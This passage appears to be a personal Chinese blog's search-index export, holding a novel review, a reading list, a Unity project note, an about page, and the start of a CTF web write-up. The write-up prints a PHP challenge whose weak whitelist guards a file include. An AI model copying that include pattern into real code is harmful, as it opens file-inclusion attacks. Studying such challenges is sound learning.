“见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨）\n这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。\n书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句：\n他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。\n陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。\n如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。\n婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。\n她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。\n弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。\n他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。\n对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。\n她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。\n不知道该怎么评价这段话。。。有点扎心。\n只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。\n爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句:\n“回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。”\n这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。\n而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。”\n胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。\n胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。\n事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。\n。。。\n作品内核分析 再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。\n爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？\n因为两人长达52年的小心翼翼的互相确认。\n费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。\n弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。\n那么，爱情是这本书的全部吗？\n很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？\n是孤独。\n怪罪于“爱”的孤独 上文中有意隐去了社会背景，纯粹讨论了这本书中两人漫长爱情的基本历程。让我们回到书名《霍乱时期的爱情》。\n这是一个什么样的社会呢？\n在同一天，他看见河上漂过三具膨胀发绿的尸体，上面还站着几只兀鹫。最先是两具男尸，其中一具没了头，而后漂过一具只有几岁的女童的尸体，她那美杜莎般的头发在船尾的航迹中上下漂浮。他永远也不会知道，因为根本没人知道，他们到底是霍乱还是战争的牺牲品，但那令人恶心的强烈气味污染了他心中对费尔明娜·达萨的思念。\n是霍乱还有战争肆虐的社会，是一个饱受殖民者压迫的社会，是一个人类所有的光荣与尊严都被肆意践踏的社会。在这里，发生着无数不被后世之人相信的现实，是一种不断循环的，历史性的孤独。\n是的，这本“爱情小说”，可能自始至终都不存在“爱情”。在一个生存意义已经被大致消解的世界，“爱情”成了个人活着的最后的被普遍接受的理由。\n霍乱刚刚流行两个星期，墓地就已经满了。尽管已将一大批不知名的贵人的枯骨迁进了集体掩埋的万人坑，教堂里还是腾不出一块可以使用的空墓地来。从没有封严的墓穴中逸出的水汽令大教堂内空气污浊，不得不将大门紧闭，直到三年以后，费尔明娜·达萨在子时弥撒中第一次近距离地看见弗洛伦蒂诺·阿里萨的那个时候才再次打开。第三周时，圣克拉拉修道院的回廊里已堆满了死人，一直堆到两边种着杨树的林荫道。最后，只得把比回廊大两倍的教会菜园辟出来当墓地。人们在那里挖掘出一个个很深的墓穴，不带棺木地草草葬下三层死人。但很快又不得不放弃了这种方式，因为被填得满满当当的土地变成了一块海绵，脚一踩，就渗出一股令人作呕的血水来。于是，人们准备在“上帝之手”庄园开辟新战场。那里是一座育肥牧场，距离城市不到一里地，后来被誉为“普世公墓”。\n自从发布了霍乱公告，本地驻军便不论白天黑夜，每隔一刻钟在碉堡上鸣炮一响。这么做是应迷信的市民要求，因为他们认为火药能净化环境。受霍乱之害最深的要数黑人，因为他们人数最多，也最贫穷。但实际上，这种疾病既不分肤色，也不分血统。而就如突然开始一样，它又突然停止了。从来没有人知道它到底造成了多大规模的伤害，不是因为无法统计，而是因为我们最常见的美德之一就是家丑不可外扬。\n\u0026ldquo;普世公墓\u0026quot;是现实的魔幻，”家丑不可外扬“是一切记录被模糊化处理后的历史的虚无，也如医生的徒弟所感慨的那样：“现在还能碰见不是因爱情而自杀的人，真是遗憾。”\n弗洛伦蒂诺是幸运的，他为自己的孤独寻找了“爱情”这一理由以作慰藉。他为此而努力，为此而堕落，为此而生活。他为自己的人生赋予了崇高的意义，而拉美人民呢？虚伪的政治，崩溃的经济，常年的战乱，还有肆虐的霍乱，多少人在此中醉生梦死。\n弗孤独了，他说自己没被爱过，但不乏真心爱他的女人，只是现实的荒诞让他无所适从，个人意志的自我毁灭冲动让感到眼前的一切只是冰冷的泡沫。他只能怪罪于求爱不得，只能靠着费尔明娜·达萨在他心中的幻影，支撑着他免于彻底堕落的命运。这种孤独是全人类的，普遍性的，是现代社会个人意志的普遍觉醒所带来的必然结果，又有多少人像弗洛伦蒂诺一样，找到了消解孤独的理由呢？\n因为这座城市，他的城市，至今仍处在时代的边缘：它依旧是当初那座炎热干燥的城市，夜晚也仍旧充斥着那些让他觉得恐怖不已的事，但同时，也仍能让人感受到青春期那种孤独的快乐。在这里，鲜花会生锈，盐巴会腐烂。四个世纪以来，除了在凋谢的月桂树和腐臭的沼泽间慢慢衰老，这里什么都没有发生。\n\u0026ldquo;这里什么也没有发生\u0026rdquo;\n写在后面 由于这本书的特殊性，这篇书评的整体基调似乎有些过于沉重了。但是你完全可以把我这个毫无经验的18岁小屁孩的分析当空话，马尔克斯这样的世界性作家，其作品的解读本身就带有多义性，一劳永逸的解读是不存在的，从书评家那里获得的解读，是经过特定的评论角度折射的，诚然我们可以从中获得十分精彩的发现和阐释，但它更多地体现着评论家自身的睿智和素养。\n更何况这是我的第二篇书评，肯定也有很多很多很多很多的不足之处，水平有限，请多包涵！\n有人说年轻人对于爱情的理解过于粗浅，很容易被浮于表面的感情打动。我认为这没有什么不好，人生本就是个体验的过程，你不能指望事事都深重而苦难，事事都富有哲思而隽永，事事都能写成浪漫的剧本流传后世，千年不朽。事实上，大多数人的感情生活没有那么复杂，胡维纳尔医生那样的伴侣才是大多数人的理想型，文艺作品带给人的是一种思考，一种美学意义上的享受，代入现实大可不必（更何况是马尔克斯这样的作家的作品）。\n费尔米娜·达萨出于对爱情的恐惧而拒绝了弗洛伦蒂诺的告白，使这场爱情迟到了51年。\n在现实中，没有那么多复杂而深刻的哲理，勇敢去爱吧，不要因为几部文学作品而深陷于作家构筑的幻想世界而无法自拔，封闭自己的内心，觉得看透了一切而懒得尝试，积极进取、大胆尝试才是人生的主旋律！\n","permalink":"http://localhost:1313/articles/El-Amor-En-Los-Tiempos-Del-Colera/","summary":"引言 我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论","title":"怪罪于爱的孤独 《霍乱时期的爱情》书评"},{"content":"前言 今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。\n评价标准 我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。\n再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子：\n海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪\n短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是：\n视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写：\n“刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！”\n我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。\n小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。\n我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。\n同学对着我的耳朵叙说着。\n有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。……\n我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。\n《金阁寺》三岛由纪夫\n大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！\n下面开始讲书（排名不分先后，已过滤课内必读书目）\n推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。\n《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。”\n这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。\n《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。”\n一个预言故事，非常讽刺，一场革命的变质。\n《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。\n我个人非常非常非常喜欢。\n《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。\n《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。\n城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。\n《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。\n《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。\n《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。\n《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。\n《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？）\n《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。\n《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。\n《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。\n《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。\n《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。\n《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。\n《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。\n《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告）\n《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊\n《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。\n《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！\n最emo的时候同学推的，看完感觉好多了。\n《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。\n《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。\n《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。\n《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。\n《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。\n《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。\n《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。\n《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。\n《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“\n文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。\n《脑髓地狱》 【日】梦野久作 本来应该放在消遣类里的，但是我认为这本书的文学性同样不输上面的任何一本，这是本奇书，阅读体验很神奇，千万不要错过。\n《伊豆的舞女》 【日】川端康成 文字描写太美了，透露出的那种细微的情感转变感染力非常非常强，可以称得上字字珠玑了。\n《静静的顿河》 【前苏联】肖洛霍夫 历史沧桑感极强，但是太长了，不建议花时间去看（那我当初是怎么看完的，疑惑）。\n《安娜·卡列尼娜》 【俄】列夫·托尔斯泰 名字记不住，印象不深了。\n《霍乱时期的爱情》 【哥伦比亚】加西亚·马尔克斯 正在看，看完写书评。大家不要觉得马尔克斯的作品都很绕啊QAQ\n这本情节很清楚，人名很好记，《百年孤独》人名绕完全是作者故意的。\n《百年孤独》 【哥伦比亚】加西亚·马尔克斯 这位更是重量级。看到一半没看完，阅历不太够，强行看完得不偿失。\n《银河铁道之夜》 【日】宫泽贤治 个人内心童话top1，既梦幻又带着淡淡的哀伤，最喜欢这种。\n《春风沉醉的晚上》 【中】郁达夫 我也不知道我为啥会看这本书，看完感觉还不错，很有代入感。\n推书！（人文社科类） 《春秋大义》 【中】熊逸 讲清楚了春秋时儒家的思维逻辑，重点是语言很通俗易懂，幽默诙谐。\n《西西弗神话》 【法】阿尔贝·加缪 对死亡的哲学探讨，感兴趣的可以看看。\n《史蒂夫·乔布斯传》 【美】沃尔特·艾萨克森 乔帮主的传奇人生。\n《异类》 【加拿大】马尔科姆·格拉德威尔 为读者指出了成功之路的方向，但怎样把握这份机遇，每个人都需要仔细思考，毕竟，不同人拥有不同的机遇。\n成功学经典作品，但对现实指导意义有限。\n这种书一时半会很难想起来QAQ\n推书！（散文杂文类） 《文化苦旅》 【中】余秋雨 看完初中作文拿高分。\n《鲁迅全集》 【中】鲁迅 以笔为刀，思想深度高。\n《精神明亮的人》 【中】王开岭 能让人叹息的散文，看起来思想很深刻，看完高中作文拿高分。\n《遥远的向日葵地》 【中】李娟 文字美，不造作，看完觉得我上我也行，实际上功力深厚。\n《一只特立独行的猪》《沉默的大多数》《我的精神家园》 【中】王小波 幽默而有深度，我很喜欢。\n推书！（消遣类） 这里的书作者一般都还健在了2333\n一般都是推理小说了（）\n《向日葵不开的夏天》 【日】道尾秀介 刺激的叙述性诡计。\n《解忧杂货店》 【日】东野圭吾 治愈小故事。\n《ZOO》 【日】乙一 好看，治愈小故事+致郁小故事的一本短篇小说合集。\n《彩虹牙刷》 【日】早坂吝 黄色推理，很刺激，看过的都说好（资源比较难找）。\n《献给虚无的供物》 【日】中井英夫 好看，文学性也挺高，三岛由纪夫很喜欢。\n《夏与冬的奏鸣曲》 【日】麻耶雄嵩 好看，结局太崩坏了，让人大跌眼镜，但我喜欢。\n总结 还有好多我看过的书我没有放上去，有可能是因为我没有想起来，也有可能是我觉得这本书水平不够。\n每个人的阅读偏好都不一样，保持阅读习惯的理由也各不相同。\n在这个浮躁的年代里，在这个人们的语言表达能力严重下降的时代里，在这个很难找到时间进行深度阅读的社会里，完整地阅读一本书是多么奢侈。我至今也没有办法解释我为什么要阅读经典，也许是为了维持廉价的优越感，也许什么也不为。\n也许对我来说，看看各个时期的作家脑子里在想啥是件很有意思的事。\n","permalink":"http://localhost:1313/articles/share-books/","summary":"前言 今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记","title":"分享一些看过的书"},{"content":"项目构思与简介 套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。\n把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（?\n因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。\n项目说明 W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹\n游戏实机截图 项目技术路线 一个正常的Unity入门项目，运用到了一些Unity的基本知识。\n物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。\n刚体碰撞的代码的具体实现如下：\n1 2 3 4 5 6 7 8 9 10 private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\u0026#34;Monster\u0026#34;)) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\u0026#34;Empty\u0026#34;); Fa.SendMessage(\u0026#34;AddScore\u0026#34;, 1); } } 总结 总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。\n链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq \u0026ndash;来自百度网盘超级会员V3的分享\n链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra \u0026ndash;来自百度网盘超级会员V3的分享\n","permalink":"http://localhost:1313/articles/KKLEEEE/","summary":"项目构思与简介 套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因","title":"KKLEEEE（Unity入门项目总结）"},{"content":"翼哥哥\n我的老博客\n果果\nFrank神\nqzx神\narcturus神\nDimole神\n","permalink":"http://localhost:1313/links/","summary":"翼哥哥 我的老博客 果果 Frank神 qzx神 arcturus神 Dimole神","title":"友链"},{"content":"老家浙江温州乐清市，现在在西安电子科技大学读书。\nQQ：2020150384\n博客园：https://www.cnblogs.com/zeroy\n上面这个博客记录了高中时期的OI代码。\n个人经历 2019-2021: NOIP2018 一等奖 434\nCSP-S 2019 一等奖 457\n2021-: 国家奖学金\niEEE Xtreme 2021 第32名\nCSP-24th 289\n西安电子科技大学程序设计新生赛2021 特等奖 第三名\n中国高校计算机大赛 团体程序设计天梯赛 2022 二等奖\nminiL CTF团队赛 第五名\n西安电子科技大学程序设计校赛2022 一等奖\n第九届ACM/ICPC陕西省赛 铜\nACM/ICPC 区域赛 济南 铜\nACM/ICPC 区域赛 杭州 铜\n中国高校计算机大赛 团体程序设计天梯赛 2023 二等奖\nACM/ICPC 陕西省赛 2023 金\n","permalink":"http://localhost:1313/about/","summary":"老家浙江温州乐清市，现在在西安电子科技大学读书。 QQ：2020150384 博客园：https://www.cnblogs.com/zeroy","title":"关于我"},{"content":"baby_web 进去之后发现是/1.php,根据提示“初始页面”，用burpsuite截获index.php，获得flag。 知识点：网页初始页面的文件名一般为index。\nwarmup 进去之后发现一个滑稽表情，用burpsuite截获数据包后发现有个source.php，打开之后发现页面源代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) {//page必须被设置且page必须是字符串，否则将被过滤 echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) {//如果page在白名单内则合法 return true; } $_page = mb_substr(//mb_substr(str,start,length)截取字符串中的一段 $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;)//查找\u0026#39;?\u0026#39;在page中首次出现的位置 );//将page问号之后的内容截掉 if (in_array($_page, $whitelist)) {//若此时的page在白名单内则合法 return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;])//_REQUEST是post和get的集合 \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;])//要求file也满足上面的要求 ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo 